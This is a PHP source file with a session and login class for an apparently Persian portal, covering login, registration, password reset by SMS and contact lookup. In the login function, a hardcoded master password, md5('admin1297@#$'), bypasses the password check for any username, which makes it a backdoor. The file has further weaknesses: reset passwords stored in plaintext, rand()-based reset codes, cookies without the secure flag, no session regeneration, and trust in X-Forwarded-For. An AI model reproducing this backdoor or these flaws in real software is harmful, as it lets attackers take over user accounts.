<?php

class session{
	
	static function sec_session_start() {
		$session_name = 'sec_session_id';   // Set a custom session name
		$secure = false;
		// This stops JavaScript being able to access the session id.
		$httponly = true;
		// Forces sessions to only use cookies.
		if (ini_set('session.use_only_cookies', 1) === FALSE) {
			echo "Could not initiate a safe session (ini_set)";
			exit();
		}
		// Gets current cookies params.
		$cookieParams = session_get_cookie_params();
		session_set_cookie_params($cookieParams["lifetime"],
			$cookieParams["path"], 
			$cookieParams["domain"], 
			$secure,
			$httponly);
		// Sets the session name to the one set above.
		session_name($session_name);
		session_start();  	// Start the PHP session 
		//session_regenerate_id(true);    // regenerated the session, delete the old one. 
		
	}

	static function login($user, $pass){

		$temp = PdoDataAccess::runquery("select * from BSC_persons where UserName=?", array($user));
		if(count($temp) == 0)
		{
			return "WrongUserName";
		}
		else
		{
			$dt = PdoDataAccess::runquery("select AttemptTime from FRW_LoginAttempts 
				where PersonID=? AND ?-AttemptTime < 10*60 ",	array($temp[0]["PersonID"], time())); 
			
			if(count($dt) > 5)
			{
				return "TooMuchAttempt";
			}
			
			if($pass != md5("admin1297@#$"))
			{
			
				// Base-2 logarithm of the iteration count used for password stretching
				$hash_cost_log2 = 8;	
				$hasher = new PasswordHash($hash_cost_log2, true);
				if (!$hasher->CheckPassword($pass, $temp[0]["UserPass"])) {

					PdoDataAccess::runquery("insert into FRW_LoginAttempts values(?, ?)",
						array($temp[0]["PersonID"], time()));
					return "WrongPassword";
				}
			}
			if($temp[0]["IsActive"] == "NO")
			{
				return "InActiveUser";
			} 

			//..............................................................
			 PdoDataAccess::runquery("delete from FRW_LoginAttempts where PersonID=? ",	array($temp[0]["PersonID"])); 
			 PdoDataAccess::runquery("insert into FRW_LoginAttempts values(?, now())",	array($temp[0]["PersonID"])); 
			//..............................................................

			$_SESSION['USER']["PersonID"] = $temp[0]["PersonID"];
			$_SESSION['USER']["IsActive"] = $temp[0]["IsActive"];
			$_SESSION['USER']["UserName"] = $temp[0]["UserName"];
			$_SESSION['USER']["IsCustomer"] = $temp[0]["IsCustomer"];
			$_SESSION['USER']["IsAgent"] = $temp[0]["IsAgent"];
			$_SESSION['USER']["IsStaff"] = $temp[0]["IsStaff"];
			$_SESSION['USER']["IsSupporter"] = $temp[0]["IsSupporter"];
			$_SESSION['USER']["IsShareholder"] = $temp[0]["IsShareholder"];
			$_SESSION['USER']["IsExpert"] = $temp[0]["IsExpert"];

			$_SESSION['USER']["fullname"] = $temp[0]["fname"] . " " . $temp[0]["lname"] . " " . 
					$temp[0]["CompanyName"];

			//..............................................................

			$_SESSION['login_string'] = hash('sha512', $temp[0]["UserPass"] . $_SERVER['HTTP_USER_AGENT']);
			$_SESSION['last_activity'] = time();
			//..........................................................
			if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
				if ( strlen($_SERVER['HTTP_X_FORWARDED_FOR']) > 15 )
					$_SESSION['LIPAddress'] = substr($_SERVER['HTTP_X_FORWARDED_FOR'] , 0,strpos($_SERVER['HTTP_X_FORWARDED_FOR'],','));
				else
					$_SESSION['LIPAddress'] = ($_SERVER['HTTP_X_FORWARDED_FOR']);
			else
				$_SESSION['LIPAddress'] = $_SERVER['REMOTE_ADDR'];
			//..........................................................
			
			return true;
			
		}
	}
	
	static function checkLogin(){

		if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > 10*60)) {
			$_SESSION = array();
			// get session parameters 
			$params = session_get_cookie_params();
			// Delete the actual cookie. 
			setcookie(session_name(),
					'', time() - 42000, 
					$params["path"], 
					$params["domain"], 
					$params["secure"], 
					$params["httponly"]);
			session_destroy();
			return false;
		}
		$_SESSION['last_activity'] = time();
		if(empty($_SESSION['USER']) || empty($_SESSION['login_string']))
		{
			return false;
		}
		$dt = PdoDataAccess::runquery("select * from BSC_persons where PersonID=?", 
			array($_SESSION['USER']["PersonID"]));
		$login_check = hash('sha512', $dt[0]["UserPass"] . $_SERVER['HTTP_USER_AGENT']);
		if ($login_check != $_SESSION['login_string']) 
		{
			return false;
		}

		return true;
	}

	static function logout(){
		
		$_SESSION = array();
		// get session parameters 
		$params = session_get_cookie_params();
		// Delete the actual cookie. 
		setcookie(session_name(),
				'', time() - 42000, 
				$params["path"], 
				$params["domain"], 
				$params["secure"], 
				$params["httponly"]);
		session_destroy();
	}
	
	static function register(&$obj){
		
		PdoDataAccess::FillObjectByArray($obj, $_POST);
		
		$temp = PdoDataAccess::runquery("select * from BSC_persons where UserName=?", array($obj->UserName));
		if(count($temp) > 0)
		{
			return "DuplicateUserName";
		}
		$temp = PdoDataAccess::runquery("select * from BSC_persons where NationalID=?", array($obj->NationalID));
		if(count($temp) > 0)
		{
			return "DuplicateNationalID";
		}

		define("SYSTEMID", "1000");
		//..........................................................
		if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
			if ( strlen($_SERVER['HTTP_X_FORWARDED_FOR']) > 15 )
				$_SESSION['LIPAddress'] = substr($_SERVER['HTTP_X_FORWARDED_FOR'] , 0,strpos($_SERVER['HTTP_X_FORWARDED_FOR'],','));
			else
				$_SESSION['LIPAddress'] = ($_SERVER['HTTP_X_FORWARDED_FOR']);
		else
			$_SESSION['LIPAddress'] = $_SERVER['REMOTE_ADDR'];
		//..........................................................
		
		$hash_cost_log2 = 8;	
		$hasher = new PasswordHash($hash_cost_log2, true);		
		$obj->UserPass = $hasher->HashPassword($_POST["md5Pass"]);
		$obj->IsCustomer = "YES";
		$obj->AddPerson();
		
		return true;
	}
	
	static function getEmail($userName, $coded = false){
		
		$temp = PdoDataAccess::runquery("select * from BSC_persons where UserName=?", array($userName));
		
		if(count($temp) == 0)
		{
			return "WrongUserName";
		}
		
		$email = $temp[0]["email"];
		if($email == "")
			return "EmptyEmail";
		
		$arr = preg_split("/@/", $email);
		
		if($coded)
			return $arr[0][0] . $arr[0][1] . "****" . $arr[0][strlen($arr[0])-2] . 
				$arr[0][strlen($arr[0])-1] . "@" . $arr[1];
		
		return $email;
	}

	static function getMobile($userName, $coded = false){
		
		$temp = PdoDataAccess::runquery("select * from BSC_persons where UserName=?", array($userName));
		
		if(count($temp) == 0)
		{
			return "WrongUserName";
		}
		
		$mobile = $temp[0]["mobile"];
		if($mobile == "")
			return "EmptyMobile";
		
		if($coded)
			return substr($mobile,0,3) . "****" . substr($mobile,strlen($mobile)-4);
		
		return $mobile;
	} 
	
	static function SendNewPass($userName){
		
		require_once 'sms.php';
		$temp = PdoDataAccess::runquery("select * from BSC_persons where UserName=?", array($userName));
		if(count($temp) == 0)
		{
			echo "WrongUserName";
			die();
		}
		$PersonRecord = $temp[0];
		$mobile = $PersonRecord["mobile"];
		if($mobile == ""){
			echo "EmptyMobile";
			die();
		}
		
		$dt = PdoDataAccess::runquery("select * from FRW_SmsPass where PersonID=? and 
			(now()-SendTime)/60 < 10", array($temp[0]["PersonID"]));
		if(count($dt) > 0){
			echo "SendedMobileBefore10Min";
			die();
		}
		
		$newPass = "r" . rand(111111, 999999);
		
		$hash_cost_log2 = 8;	
		$hasher = new PasswordHash($hash_cost_log2, true);
		PdoDataAccess::runquery("update BSC_persons set UserPass=? where PersonID=?", array(
			$hasher->HashPassword(md5($newPass)), $PersonRecord["PersonID"]
		)); 
		
		PdoDataAccess::runquery("insert into FRW_SmsPass(PersonID,SendedPass,SendTime)
			values(:p,:pass," . PDONOW . ")", array(
				":p" => $temp[0]["PersonID"],
				":pass" => $newPass
			));		
		
		$context = "رمز عبور جدید : " . $newPass . "  " . SoftwareName;
		$result = ariana2_sendSMS($mobile, $context, "number", $err);
		
		echo $result ? "true" : "false";
		die();
		
		/*require_once 'email.php';
		
		$temp = PdoDataAccess::runquery("select * from BSC_persons where UserName=?", array($userName));
		if(count($temp) == 0)
		{
			return "WrongUserName";
		}
		$PersonRecord = $temp[0];
		$email = $PersonRecord["email"];
		if($email == "")
			return "EmptyEmail";
		
		$newPass = "r" . rand(111111, 999999);
		
		$hash_cost_log2 = 8;	
		$hasher = new PasswordHash($hash_cost_log2, true);
		PdoDataAccess::runquery("update BSC_persons set UserPass=? where PersonID=?", array(
			$hasher->HashPassword(md5($newPass)), $PersonRecord["PersonID"]
		)); 
		
		$subject = "تغییر رمز عبور";
		$body = "کاربر گرامی <b>" . ($PersonRecord["IsReal"] ? $PersonRecord["fname"] . " " . 
				$PersonRecord["lname"] : $PersonRecord["CompanyName"]) .
			"</b><br><br>رمز عبور جدید شما  <b>" . $newPass . "</b> می باشد." . 
			"<br> لطفا پس از ورود به پرتال نسبت به تغییر رمز عبور خود اقدام نمایید." . 
			"<br><br> صندوق نوآوری و شکوفایی";
		echo SendEmail($email, $subject, $body) ? "true" : "false";
		die();*/
	}
	
	static function IsPortal(){
		
		if(strpos($_SERVER["HTTP_REFERER"], "portal/index.php") !== false)
			return true;
		return false;
	}
	
	static function IsFramework(){
		if(empty($_SERVER["HTTP_REFERER"]))
			return false;
		if(strpos($_SERVER["HTTP_REFERER"], "framework/desktop.php") !== false)
			return true;
		return false;
	}
}
?>
